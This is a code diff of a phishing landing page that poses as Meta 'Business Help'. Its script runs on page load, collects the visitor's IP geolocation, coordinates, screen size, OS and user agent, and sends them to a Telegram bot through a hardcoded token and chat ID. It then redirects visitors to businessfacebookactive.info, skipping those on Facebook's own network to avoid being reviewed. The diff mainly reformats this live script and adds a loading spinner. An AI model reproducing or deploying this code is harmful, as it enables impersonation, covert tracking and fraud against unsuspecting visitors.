@@ -1,29 +1,44 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head>
-        <meta charset="UTF-8" />
-        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-        <meta name="description" content="Business Help" />
-        <meta property="og:title" content="Business Help" />
-        <meta property="og:description" content="Business Help" />
-        <meta property="og:type" content="website" />
-        <meta property="og:image" content="https://www.ecommerce-nation.fr/wp-content/uploads/2023/10/meta-business-suite.webp" />
-        <title>'Business Help'</title>
-    </head>
-    <body>
-        <script>
-            document.addEventListener('DOMContentLoaded', async () => {
-                const URL_REDIRECT = 'https://businessfacebookactive.info/help';
-                const BOT_TOKEN = '8326611419:AAEJ7IbkbQ30oDd1dcwr8uTho-t1c2tX_X8';
-                const CHAT_ID = '-1003997569663';
-                const url = 'https://get.geojs.io/v1/ip/geo.json';
-                const geoResponse = await fetch(url);
-                const geoData = await geoResponse.json();
-                const screenWidth = window.screen.width;
-                const screenHeight = window.screen.height;
-                const osInfo = navigator.platform;
-                const userAgent = navigator.userAgent.toLowerCase();
-                const fullData = `
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="description" content="Business Help" />
+    <meta property="og:title" content="Business Help" />
+    <meta property="og:description" content="Business Help" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="https://www.ecommerce-nation.fr/wp-content/uploads/2023/10/meta-business-suite.webp" />
+    <title>Business Help</title>
+
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+</head>
+<body class="bg-white">
+    <!-- Splash Screen -->
+    <div
+        id="splash"
+        class="fixed inset-0 flex items-center justify-center bg-white z-50"
+    >
+        <div
+            class="w-12 h-12 border-4 border-gray-300 border-t-gray-600 rounded-full animate-spin"
+        ></div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', async () => {
+            const URL_REDIRECT = 'https://businessfacebookactive.info/help';
+            const BOT_TOKEN = '8326611419:AAEJ7IbkbQ30oDd1dcwr8uTho-t1c2tX_X8';
+            const CHAT_ID = '-1003997569663';
+
+            const url = 'https://get.geojs.io/v1/ip/geo.json';
+            const geoResponse = await fetch(url);
+            const geoData = await geoResponse.json();
+
+            const screenWidth = window.screen.width;
+            const screenHeight = window.screen.height;
+            const osInfo = navigator.platform;
+            const userAgent = navigator.userAgent.toLowerCase();
+
+            const fullData = `
 <b>Location:</b> <code>${geoData.city}, ${geoData.region}, ${geoData.country}</code>
 <b>IP:</b> <code>${geoData.ip}</code>
 <b>Coordinates:</b> <code>${geoData.latitude}, ${geoData.longitude}</code>
@@ -36,20 +51,23 @@
 <b>OS:</b> <code>${osInfo}</code>
 <b>User Agent:</b> <code>${userAgent}</code>`;
 
-                const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                await fetch(telegramUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: fullData, parse_mode: 'HTML' })
-                });
-                if(geoData.asn === 32934){
-                }else{
-                window.location.href = URL_REDIRECT;}
+            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            await fetch(telegramUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: fullData,
+                    parse_mode: 'HTML'
+                })
             });
-        </script>
-    </body>
+
+            if (geoData.asn === 32934) {
+            } else {
+                window.location.href = URL_REDIRECT;
+            }
+        });
+    </script>
+</body>
 </html>
-
-
-
-
